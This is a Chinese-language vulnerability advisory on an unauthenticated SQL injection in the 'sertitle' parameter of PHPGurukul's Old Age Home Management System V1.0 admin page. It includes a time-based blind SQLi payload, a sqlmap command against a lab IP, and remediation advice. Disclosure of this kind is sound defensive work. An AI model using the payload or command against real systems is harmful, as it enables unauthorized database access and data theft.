# PHPGurukul 养老院管理系统 V1.0 /admin/add-services.php SQL 注入

# 受影响产品的名称

- 养老院管理系统

## 供应商主页

- https://phpgurukul.com/old-age-home-management-system-using-php-and-mysql/

# 受影响或已修复的版本

## 提交者

- 0xabandon

## 漏洞文件

- /admin/add-services.php

## 版本

- V1.0

## 软件链接

- https://phpgurukul.com/projects/Old-Age-Home-MS-using-PHP.zip

# 问题类型

## 漏洞类型

- SQL 注入

## 根本原因

- 在“养老院管理系统“项目中的“/admin/add-services.php”文件中发现一个 SQL 注入漏洞。导致此问题的原因是攻击者从参数“sertitle”中注入恶意代码，并直接在 SQL 查询中使用，而无需进行适当的清理或验证。这允许攻击者伪造输入值，从而操纵 SQL 查询并执行未经授权的操作。

## 影响

- 攻击者可利用此 SQL 注入漏洞，实现未经授权的数据库访问、敏感数据泄漏、数据篡改、全面系统控制，甚至服务中断，对系统安全和业务连续性构成严重威胁。

# 描述

- 在对 “养老院管理系统 ”进行安全检查时，发现“/admin/add-services.php”文件中存在严重的 SQL 注入漏洞。该漏洞源于 “sertitle”参数的用户输入验证不足，允许攻击者注入恶意 SQL 查询。因此，攻击者可在未经授权的情况下访问数据库、修改或删除数据以及访问敏感信息。需要立即采取补救措施，以确保系统安全和保护数据完整性。

# 利用此漏洞无需登录或授权

# 漏洞详情和 POC

## 漏洞:

- “sertitle”参数

## Payload:

```makefile
Parameter: sertitle (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sertitle=11' AND (SELECT 9461 FROM (SELECT(SLEEP(5)))bvmh) AND 'rKQK'='rKQK&serdes=11&submit=
```

## 以下是使用 sqlmap 工具测试和运行时获得的一些具体信息的截图：

```bash
    sqlmap -u "http://10.20.33.25/oahms/admin/add-services.php" --data="sertitle=11&serdes=11&submit=" --dbs
```

![Image](https://github.com/user-attachments/assets/9dc48aa2-22e7-46c0-ac68-9ae18e796dcf)

# 修复建议

1. **使用准备语句和参数绑定：**
   准备语句可防止 SQL 注入，因为它们将 SQL 代码与用户输入数据分开。使用准备语句时，用户输入的值将被视为纯数据，不会被解释为 SQL 代码。

2. **输入验证和过滤：**
   严格验证和过滤用户输入数据，确保其符合预期格式。

3. **尽量减少数据库用户权限：**
   确保用于连接数据库的账户具有最低必要权限。避免在日常操作中使用具有高级权限的账户（如 “root ”或 “admin”）。

4. **定期安全审计：**
   定期进行代码和系统安全审计，及时发现并修复潜在的安全漏洞。